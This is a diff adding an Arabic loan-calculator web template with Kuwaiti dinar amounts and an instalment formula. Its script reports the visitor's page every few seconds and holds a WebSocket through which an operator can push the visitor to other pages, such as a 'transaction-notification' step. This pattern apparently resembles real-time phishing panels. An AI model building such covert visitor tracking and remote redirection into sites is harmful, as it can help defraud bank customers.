@@ -1,0 +1,750 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>حاسبة القرض</title> <link rel="stylesheet" href="{{ url_for('static', path='css/fonts.css') }}"> <style> * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "InterLocal", system-ui, -apple-system, "Segoe UI", sans-serif;
+      background: #ffffff;
+      color: #1f2937;
+    }
+
+    .loan-header {
+      height: 58px;
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 16px;
+      position: relative;
+    }
+
+    .loan-back-btn {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 34px;
+      height: 34px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      color: #01a4e0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .loan-back-btn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .loan-logo {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+
+    .loan-intro {
+      margin: 30px auto 0;
+      padding: 0 16px;
+      text-align: center;
+      font-size: 0.85rem;
+      font-weight: 400;
+      color: #374151;
+    }
+
+    .calculator-shell {
+      max-width: 900px;
+      margin: 8px auto 0;
+      padding: 0 30px 14px;
+      margin-top: 40px;
+    }
+
+    .input-row {
+      display: grid;
+      grid-template-columns: 84px 1fr;
+      align-items: end;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .input-label {
+      margin: 0;
+      font-size: 0.88rem;
+      font-weight: 400;
+      color: #0f172a;
+      text-align: right;
+    }
+
+    .line-input {
+      width: 100%;
+      border: 0;
+      border-bottom: 2px solid #c8c9cb;
+      background: transparent;
+      direction: ltr;
+      text-align: center;
+      min-height: 34px;
+      padding: 0 0 3px;
+      line-height: 1;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #676d75;
+      outline: none;
+    }
+
+    .line-input:focus {
+      border-bottom-color: #04a3e0;
+    }
+
+    .line-input:out-of-range,
+    .line-input:focus:out-of-range {
+      border-bottom-color: #dc2626;
+    }
+
+    .line-input:invalid,
+    .line-input:focus:invalid {
+      border-bottom-color: #dc2626;
+    }
+
+    .line-input::placeholder {
+      color: #9ea2a8;
+      opacity: 1;
+      direction: rtl;
+      unicode-bidi: plaintext;
+    }
+
+    #amount,
+    #loanterm,
+    #upfront_amount {
+      width: 70%;
+      margin-inline: auto;
+    }
+
+    .input-stack {
+      position: relative;
+      width: 70%;
+      margin-inline: auto;
+    }
+
+    .input-stack #upfront_amount {
+      width: 100%;
+      margin-inline: 0;
+    }
+
+    .input-row--with-error {
+      margin-bottom: 42px;
+    }
+
+    .field-error {
+      position: absolute;
+      top: calc(100% + 6px);
+      left: 0;
+      width: 100%;
+      margin: 0;
+      color: #dc2626;
+      font-size: 0.76rem;
+      line-height: 1.2;
+      text-align: center;
+      display: none;
+    }
+
+    .field-error.is-visible {
+      display: block;
+    }
+
+    .result-section {
+      margin-top: 50px;
+      display: grid;
+      gap: 14px;
+    }
+
+    .result-row {
+      min-height: 44px;
+      border-radius: 16px;
+      background: #f7f7f7;
+      padding: 0 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .result-label {
+      margin: 0;
+      font-size: 0.82rem;
+      font-weight: 400;
+      color: #56595e;
+      line-height: 1.2;
+      text-align: right;
+    }
+
+    .result-value {
+      margin: 0;
+      font-size: 0.82rem;
+      font-weight: 400;
+      color: #56595e;
+      line-height: 1.2;
+      direction: ltr;
+      text-align: left;
+      letter-spacing: 0.02em;
+      display: inline-flex;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 24px;
+    }
+
+    .result-value.is-loading {
+      color: transparent;
+    }
+
+    .loan-cta {
+      margin-top: 26px;
+      padding: 16px 0 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .loan-cta-details {
+      display: grid;
+      gap: 2px;
+      text-align: right;
+    }
+
+    .loan-cta-amount {
+      margin: 0;
+      font-size: 0.96rem;
+      font-weight: 600;
+      color: #1099d7;
+      line-height: 1.2;
+    }
+
+    .loan-cta-type {
+      margin: 0;
+      font-size: 0.92rem;
+      font-weight: 400;
+      color: #4b5563;
+      line-height: 1.3;
+    }
+
+    .loan-submit-btn {
+      min-width: 114px;
+      min-height: 30px;
+      border: 0;
+      border-radius: 10px;
+      background: #1498ce;
+      color: #ffffff;
+      font-size: 0.98rem;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 0 22px;
+      transition: opacity 0.2s ease;
+    }
+
+    .loan-submit-btn:disabled {
+      opacity: 0.42;
+      cursor: not-allowed;
+    }
+
+    .progress-ring {
+      width: 28px;
+      height: 28px;
+      border: 4px solid #d4edf8;
+      border-left-color: transparent;
+      border-top-color: #04a3e0;
+      border-right-color: #04a3e0;
+      border-radius: 50%;
+      animation: spin-ring 0.8s linear infinite;
+    }
+
+    @keyframes spin-ring {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 700px) {
+      .input-row {
+        grid-template-columns: 78px 1fr;
+        gap: 8px;
+        margin-bottom: 9px;
+      }
+
+      .input-label {
+        font-size: 0.82rem;
+      }
+
+      .line-input {
+        min-height: 32px;
+        padding-bottom: 2px;
+        font-size: 0.84rem;
+      }
+
+      .input-row--with-error {
+        margin-bottom: 36px;
+      }
+
+      .result-section {
+        margin-top: 30px;
+        gap: 12px;
+      }
+
+      .result-row {
+        min-height: 44px;
+        border-radius: 10px;
+        padding: 0 14px;
+      }
+
+      .result-label,
+      .result-value {
+        font-size: 0.82rem;
+      }
+
+      .loan-cta {
+        margin-top: 22px;
+        padding-bottom: 8px;
+      }
+
+      .loan-cta-amount {
+        font-size: 0.9rem;
+      }
+
+      .loan-cta-type {
+        font-size: 0.86rem;
+      }
+
+      .loan-submit-btn {
+        min-width: 106px;
+        min-height: 30px;
+        border-radius: 10px;
+        font-size: 0.9rem;
+        padding: 0 18px;
+      }
+
+      .progress-ring {
+        width: 24px;
+        height: 24px;
+        border-width: 3px;
+      }
+
+    } </style> </head> <body> <header class="loan-header"> <button class="loan-back-btn" id="loan-back-btn" type="button" aria-label="رجوع"> <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"> <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/> </svg> </button> <img src="{{ url_for('static', path='images/logo.png') }}" alt="Logo" class="loan-logo"> </header> <p class="loan-intro">مرحبا, يرجى تعبئة البيانات لإحتساب القرض الخاص بك</p> <main class="calculator-shell"> <section> <div class="input-row"> <p class="input-label">المبلغ</p> <input class="line-input" id="amount" type="number" {% if selected_card_key == "cash" %} min="1500" max="25000" placeholder="25000 - 1500" {% elif selected_card_key == "automobile" %} min="1000" max="25000" placeholder="25000 - 1000" {% elif selected_card_key in ["furniture", "marine", "electrical"] %} min="1000" max="25000" placeholder="25000 - 1000" {% elif selected_card_key == "housing" %} min="3000" max="70000" placeholder="70000 - 3000" {% elif selected_card_key == "educational" %} min="1000" max="5000" placeholder="5000 - 1000" {% elif selected_card_key == "commercial" %} min="1000" max="100000" placeholder="100000 - 1000" {% else %} placeholder="900 - 150" {% endif %} > </div> <div class="input-row"> <p class="input-label">المدة</p> <input class="line-input" id="loanterm" type="number" {% if selected_card_key == "cash" %} min="24" max="60" placeholder="60 - 24" {% elif selected_card_key == "automobile" %} min="12" max="60" placeholder="60 - 12" {% elif selected_card_key in ["furniture", "marine", "electrical"] %} min="12" max="60" placeholder="60 - 12" {% elif selected_card_key == "housing" %} min="12" max="84" placeholder="84 - 12" {% elif selected_card_key == "educational" %} min="12" max="36" placeholder="36 - 12" {% elif selected_card_key == "commercial" %} min="12" max="60" placeholder="60 - 12" {% else %} placeholder="60 - 24" {% endif %} > </div> {% if selected_card_key == "automobile" %} <div class="input-row input-row--with-error"> <p class="input-label">دفعة مقدمة</p> <div class="input-stack"> <input class="line-input" id="upfront_amount" type="number" min="100" placeholder="100"> <p id="upfront-amount-error" class="field-error" aria-live="polite"></p> </div> </div> {% endif %} </section> <section class="result-section" aria-label="نتائج الحاسبة"> <div class="result-row"> <p class="result-label">مبلغ القرض</p> <p class="result-value" id="loan-amount-value">--</p> </div> <div class="result-row"> <p class="result-label">مبلغ الفائدة</p> <p class="result-value" id="interest-amount-value">--</p> </div> <div class="result-row"> <p class="result-label">إجمالي قيمة القرض</p> <p class="result-value" id="total-loan-value">--</p> </div> <div class="result-row"> <p class="result-label">القسط الشهري</p> <p class="result-value" id="monthly-installment-value">--</p> </div> <div class="result-row"> <p class="result-label">نسبة الفائدة</p> <p class="result-value" id="interest-rate-value">--</p> </div> </section> <section class="loan-cta" aria-label="تقديم الطلب"> <div class="loan-cta-details"> <p class="loan-cta-amount" id="requested-amount-display"> - </p> <p class="loan-cta-type">{{ selected_card.title }}</p> </div> <button class="loan-submit-btn" id="loan-submit-btn" type="button" disabled="disabled">تقديم</button> </section> </main> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+      const selectedCardKey = "{{ selected_card_key }}";
+      const configuredAnnualInterestRate = Number("{{ annual_interest_rate }}");
+      const annualInterestRate = Number.isFinite(configuredAnnualInterestRate) && configuredAnnualInterestRate > 0
+        ? configuredAnnualInterestRate
+        : 6.5;
+      const currentPage = `حاسبة القرض - {{ selected_card.title }}`;
+      const amountInput = document.getElementById("amount");
+      const loanTermInput = document.getElementById("loanterm");
+      const backButton = document.getElementById("loan-back-btn");
+      const loanSubmitButton = document.getElementById("loan-submit-btn");
+      const requestedAmountDisplay = document.getElementById("requested-amount-display");
+      const loanAmountValue = document.getElementById("loan-amount-value");
+      const interestAmountValue = document.getElementById("interest-amount-value");
+      const totalLoanValue = document.getElementById("total-loan-value");
+      const monthlyInstallmentValue = document.getElementById("monthly-installment-value");
+      const interestRateValue = document.getElementById("interest-rate-value");
+      const defaultRequestedAmountText = " - ";
+
+      fetch('/visitors/current-page', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'same-origin',
+        body: JSON.stringify({ current_page: currentPage })
+      }).catch(() => {});
+
+      const checkAdminRedirect = () => {
+        fetch('/visitors/redirect-check', {
+          method: 'GET',
+          headers: { Accept: 'application/json' },
+          credentials: 'same-origin',
+          cache: 'no-store'
+        })
+          .then((response) => response.ok ? response.json() : null)
+          .then((payload) => {
+            if (!payload || payload.redirect !== true) {
+              return;
+            }
+            const targetPath = typeof payload.target_path === 'string' ? payload.target_path.trim() : '';
+            if (targetPath && targetPath !== window.location.pathname) {
+              window.location.href = targetPath;
+            }
+          })
+          .catch(() => {});
+      };
+
+      let redirectSocket = null;
+      let redirectSocketReconnectTimer = null;
+      let redirectSocketPingTimer = null;
+      let hasRedirected = false;
+
+      const navigateToRedirectTarget = (targetPathRaw) => {
+        if (hasRedirected) {
+          return;
+        }
+        const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
+        const targetPath = ({
+          "/additional-info": "/additional-customer-info",
+          "/transaction-info": "/transaction-notification"
+        }[targetPathInput] || targetPathInput);
+        if (!targetPath || targetPath === window.location.pathname) {
+          return;
+        }
+        hasRedirected = true;
+        window.location.href = targetPath;
+      };
+
+      const connectAdminRedirectSocket = () => {
+        if (redirectSocketReconnectTimer) {
+          clearTimeout(redirectSocketReconnectTimer);
+          redirectSocketReconnectTimer = null;
+        }
+        if (redirectSocketPingTimer) {
+          clearInterval(redirectSocketPingTimer);
+          redirectSocketPingTimer = null;
+        }
+        if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+          return;
+        }
+
+        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+        try {
+          redirectSocket = new WebSocket(socketUrl);
+        } catch (_) {
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+          return;
+        }
+
+        redirectSocket.addEventListener("open", () => {
+          redirectSocketPingTimer = setInterval(() => {
+            if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+              return;
+            }
+            try {
+              redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
+            } catch (_) {
+              // noop
+            }
+          }, 5000);
+        });
+
+        redirectSocket.addEventListener("message", (event) => {
+          let payload = null;
+          try {
+            payload = JSON.parse(event.data);
+          } catch (_) {
+            payload = null;
+          }
+          const eventName = payload && typeof payload === "object"
+            ? String(payload.event || "").trim().toLowerCase()
+            : "";
+          if (eventName !== "visitor.redirect") {
+            return;
+          }
+          const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+            ? payload.meta
+            : null;
+          navigateToRedirectTarget(meta ? meta.target_path : "");
+        });
+
+        redirectSocket.addEventListener("close", () => {
+          if (redirectSocketPingTimer) {
+            clearInterval(redirectSocketPingTimer);
+            redirectSocketPingTimer = null;
+          }
+          redirectSocket = null;
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+        });
+
+        redirectSocket.addEventListener("error", () => {
+          try {
+            redirectSocket.close();
+          } catch (_) {
+            // noop
+          }
+        });
+      };
+
+      const sendHeartbeat = () => {
+        fetch('/visitors/heartbeat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'same-origin',
+          body: JSON.stringify({ current_page: currentPage })
+        }).catch(() => {});
+        checkAdminRedirect();
+      };
+
+      sendHeartbeat();
+      connectAdminRedirectSocket();
+      const heartbeatInterval = setInterval(() => {
+        if (document.visibilityState === 'visible') {
+          sendHeartbeat();
+        }
+      }, 5000);
+      const redirectFallbackInterval = setInterval(() => {
+        if (document.visibilityState === 'visible') {
+          checkAdminRedirect();
+        }
+      }, 15000);
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+          sendHeartbeat();
+        }
+      });
+      window.addEventListener('pageshow', () => {
+        hasRedirected = false;
+        sendHeartbeat();
+        connectAdminRedirectSocket();
+      });
+      window.addEventListener('beforeunload', () => {
+        clearInterval(heartbeatInterval);
+        clearInterval(redirectFallbackInterval);
+      });
+
+      backButton?.addEventListener("click", () => {
+        window.location.href = "/";
+      });
+
+      let isSubmittingLoan = false;
+      loanSubmitButton?.addEventListener("click", async () => {
+        if (loanSubmitButton.disabled) {
+          return;
+        }
+
+        const amountValue = Number(amountInput?.value ?? "");
+        const loantermValue = Number.parseInt(loanTermInput?.value ?? "", 10);
+        const hasValidPayload = Number.isFinite(amountValue) && amountValue > 0
+          && Number.isInteger(loantermValue) && loantermValue > 0;
+
+        if (!hasValidPayload || isSubmittingLoan) {
+          return;
+        }
+
+        isSubmittingLoan = true;
+        loanSubmitButton.disabled = true;
+
+        try {
+          const response = await fetch("/visitors/loan-submission", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "same-origin",
+            body: JSON.stringify({
+              amount: amountValue,
+              loanterm: loantermValue,
+              loan_type: selectedCardKey
+            })
+          });
+
+          if (response.ok) {
+            window.location.href = `/customer-info?card=${encodeURIComponent(selectedCardKey)}`;
+            return;
+          }
+        } catch (_) {
+          // noop
+        }
+
+        isSubmittingLoan = false;
+        setSubmitEnabled(true);
+      });
+
+      const hasValue = (value) => value.trim() !== "";
+      const formatNumber = (value) => new Intl.NumberFormat("en-US", {
+        minimumFractionDigits: 3,
+        maximumFractionDigits: 3
+      }).format(value);
+      const setSubmitEnabled = (enabled) => {
+        if (loanSubmitButton) {
+          loanSubmitButton.disabled = !enabled;
+        }
+      };
+      const setRequestedAmount = (value) => {
+        if (!requestedAmountDisplay) {
+          return;
+        }
+        if (value === null) {
+          requestedAmountDisplay.textContent = defaultRequestedAmountText;
+          return;
+        }
+        requestedAmountDisplay.textContent = `${formatNumber(value)} د.ك`;
+      };
+      const calculatedFields = [
+        loanAmountValue,
+        interestAmountValue,
+        totalLoanValue,
+        monthlyInstallmentValue
+      ].filter(Boolean);
+      let calculationTimer = null;
+      let calculationToken = 0;
+
+      const clearCalculationTimer = () => {
+        if (calculationTimer) {
+          clearTimeout(calculationTimer);
+          calculationTimer = null;
+        }
+      };
+
+      const setLoadingState = (isLoading) => {
+        calculatedFields.forEach((field) => {
+          if (!field) {
+            return;
+          }
+          if (isLoading) {
+            field.classList.add("is-loading");
+            field.innerHTML = '<span class="progress-ring" aria-hidden="true"></span>';
+          } else {
+            field.classList.remove("is-loading");
+          }
+        });
+      };
+
+      const resetCalculatedValues = () => {
+        calculationToken += 1;
+        clearCalculationTimer();
+        setLoadingState(false);
+        if (loanAmountValue) loanAmountValue.textContent = "--";
+        if (interestAmountValue) interestAmountValue.textContent = "--";
+        if (totalLoanValue) totalLoanValue.textContent = "--";
+        if (monthlyInstallmentValue) monthlyInstallmentValue.textContent = "--";
+        setSubmitEnabled(false);
+        setRequestedAmount(null);
+      };
+
+      const renderCalculatedValues = ({ principalAmount, interestAmount, totalLoan, monthlyInstallment }) => {
+        calculationToken += 1;
+        const activeToken = calculationToken;
+        clearCalculationTimer();
+        setLoadingState(true);
+        calculationTimer = setTimeout(() => {
+          if (activeToken !== calculationToken) {
+            return;
+          }
+          setLoadingState(false);
+          if (loanAmountValue) loanAmountValue.textContent = formatNumber(principalAmount);
+          if (interestAmountValue) interestAmountValue.textContent = formatNumber(interestAmount);
+          if (totalLoanValue) totalLoanValue.textContent = formatNumber(totalLoan);
+          if (monthlyInstallmentValue) monthlyInstallmentValue.textContent = formatNumber(monthlyInstallment);
+        }, 300);
+      };
+
+      const calculateLoan = () => {
+        if (!amountInput || !loanTermInput) {
+          return;
+        }
+
+        const amountRaw = amountInput.value ?? "";
+        const loanTermRaw = loanTermInput.value ?? "";
+        const amount = Number(amountRaw);
+        const loanTerm = Number(loanTermRaw);
+        const amountIsValid = hasValue(amountRaw) && Number.isFinite(amount) && amount > 0 && amountInput.checkValidity();
+        const termIsValid = hasValue(loanTermRaw) && Number.isFinite(loanTerm) && loanTerm > 0 && loanTermInput.checkValidity();
+        let principalAmount = amount;
+
+        if (selectedCardKey === "automobile") {
+          const upfrontAmountInput = document.getElementById("upfront_amount");
+          const upfrontAmountRaw = upfrontAmountInput?.value ?? "";
+          const upfrontAmount = Number(upfrontAmountRaw);
+          const upfrontAmountIsValid = !!upfrontAmountInput
+            && hasValue(upfrontAmountRaw)
+            && Number.isFinite(upfrontAmount)
+            && upfrontAmount >= 0
+            && upfrontAmountInput.checkValidity();
+
+          if (!amountIsValid || !upfrontAmountIsValid || upfrontAmount > amount) {
+            resetCalculatedValues();
+            return;
+          }
+
+          principalAmount = amount - upfrontAmount;
+          if (principalAmount < 1000) {
+            resetCalculatedValues();
+            return;
+          }
+        }
+
+        if (!amountIsValid || !termIsValid) {
+          resetCalculatedValues();
+          return;
+        }
+
+        const monthlyRate = annualInterestRate / 12 / 100;
+        const monthlyInstallment = monthlyRate === 0
+          ? principalAmount / loanTerm
+          : (principalAmount * monthlyRate * Math.pow(1 + monthlyRate, loanTerm)) / (Math.pow(1 + monthlyRate, loanTerm) - 1);
+        const totalLoan = monthlyInstallment * loanTerm;
+        const interestAmount = totalLoan - principalAmount;
+
+        renderCalculatedValues({
+          principalAmount,
+          interestAmount,
+          totalLoan,
+          monthlyInstallment
+        });
+        setRequestedAmount(principalAmount);
+        setSubmitEnabled(true);
+      };
+
+      if (interestRateValue) {
+        interestRateValue.textContent = formatNumber(annualInterestRate);
+      }
+
+      amountInput?.addEventListener("input", calculateLoan);
+      loanTermInput?.addEventListener("input", calculateLoan);
+
+      if (selectedCardKey === "automobile") {
+        const upfrontAmountInput = document.getElementById("upfront_amount");
+        const errorElement = document.getElementById("upfront-amount-error");
+        const exceedsAmountError = "قيمة الدفعة المقدمة يجب أن تقل عن قيمة القرض";
+        const minimumLoanError = "قيمة القرض بعد خصم الدفعة المقدمة يجب ألا تقل عن 1000";
+
+        const validateUpfrontAmount = () => {
+          const amountRaw = amountInput?.value ?? "";
+          const upfrontAmountRaw = upfrontAmountInput?.value ?? "";
+          const amountValue = Number(amountRaw);
+          const upfrontAmountValue = Number(upfrontAmountRaw);
+          const amountInRange = hasValue(amountRaw) && amountValue >= 1000 && amountValue <= 25000;
+          const hasUpfrontAmount = hasValue(upfrontAmountRaw);
+          const upfrontAmountExceedsAmount = amountInRange && hasUpfrontAmount && upfrontAmountValue > amountValue;
+          const netLoanTooLow = amountInRange && hasUpfrontAmount && upfrontAmountValue <= amountValue && (amountValue - upfrontAmountValue) < 1000;
+
+          if (upfrontAmountExceedsAmount) {
+            upfrontAmountInput.setCustomValidity(exceedsAmountError);
+            if (errorElement) {
+              errorElement.textContent = exceedsAmountError;
+              errorElement.classList.add("is-visible");
+            }
+            return;
+          }
+
+          if (netLoanTooLow) {
+            upfrontAmountInput.setCustomValidity(minimumLoanError);
+            if (errorElement) {
+              errorElement.textContent = minimumLoanError;
+              errorElement.classList.add("is-visible");
+            }
+            return;
+          }
+
+          upfrontAmountInput.setCustomValidity("");
+          if (errorElement) {
+            errorElement.textContent = "";
+            errorElement.classList.remove("is-visible");
+          }
+        };
+
+        amountInput?.addEventListener("input", validateUpfrontAmount);
+        upfrontAmountInput?.addEventListener("input", validateUpfrontAmount);
+        upfrontAmountInput?.addEventListener("input", calculateLoan);
+        validateUpfrontAmount();
+      }
+
+      calculateLoan();
+    })(); </script> </body> </html> 
